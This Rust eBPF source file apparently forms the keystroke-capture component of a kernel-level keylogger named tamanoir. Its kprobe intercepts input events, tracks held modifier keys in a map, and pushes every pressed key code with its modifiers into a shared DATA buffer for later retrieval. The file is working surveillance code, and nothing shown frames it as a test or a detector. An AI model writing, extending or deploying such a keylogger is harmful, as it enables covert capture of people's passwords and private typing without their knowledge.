use core::mem;

use aya_ebpf::{
    macros::{kprobe, map},
    maps::HashMap,
    programs::ProbeContext,
};
use aya_log_ebpf::debug;

use crate::common::DATA;
const KEY_EVENT: u32 = 1;
const KEY_CODE_MAX: u8 = u8::MAX;

#[derive(Clone, Copy)]
#[repr(u8)]
enum Modifiers {
    LCtrl = 29,
    LShift = 42,
    RShift = 54,
    Alt = 56,
    Altgr = 100,
}
impl Modifiers {
    pub const LEN: usize = mem::size_of::<Modifiers>();
    pub fn variants() -> &'static [Modifiers] {
        &[
            Modifiers::LCtrl,
            Modifiers::LShift,
            Modifiers::RShift,
            Modifiers::Alt,
            Modifiers::Altgr,
        ]
    }
    pub fn from_id(id: u8) -> Option<Self> {
        match id {
            29 => Some(Self::LCtrl),
            42 => Some(Self::LShift),
            54 => Some(Self::RShift),
            56 => Some(Self::Alt),
            100 => Some(Self::Altgr),
            _ => None,
        }
    }
}

#[map]
pub static MODIFIERS_STATE: HashMap<u8, u8> =
    HashMap::<u8, u8>::with_max_entries(Modifiers::LEN as u32, 0);

#[kprobe]
pub fn tamanoir_kprobe(ctx: ProbeContext) -> u32 {
    match kprobe_process(ctx) {
        Ok(ret) => ret,
        Err(ret) => ret,
    }
}

fn kprobe_process(ctx: ProbeContext) -> Result<u32, u32> {
    let event_type: u32 = ctx.arg(1).ok_or(0u32)?;
    let code: u32 = ctx.arg(2).ok_or(0u32)?;
    let value: u32 = ctx.arg(3).ok_or(0u32)?;

    if event_type == KEY_EVENT && code <= KEY_CODE_MAX as u32 {
        let code = code as u8;
        if Modifiers::from_id(code).is_some() {
            match value {
                0 => MODIFIERS_STATE.remove(&code).map_err(|_| 1u32)?,
                1 => MODIFIERS_STATE.insert(&code, &1, 0).map_err(|_| 1u32)?,
                _ => {}
            }
        } else {
            match value {
                0 => {}
                _ => {
                    for modifier in Modifiers::variants() {
                        let modifier = *modifier as u8;
                        if unsafe { MODIFIERS_STATE.get(&modifier) }.is_some() {
                            debug!(&ctx, "mod: {} +", modifier);

                            let _ = DATA.push(&modifier, 0);
                        }
                    }
                    debug!(&ctx, "key: {}", code);
                    let _ = DATA.push(&code, 0);
                }
            }
        }
    }

    Ok(0)
}
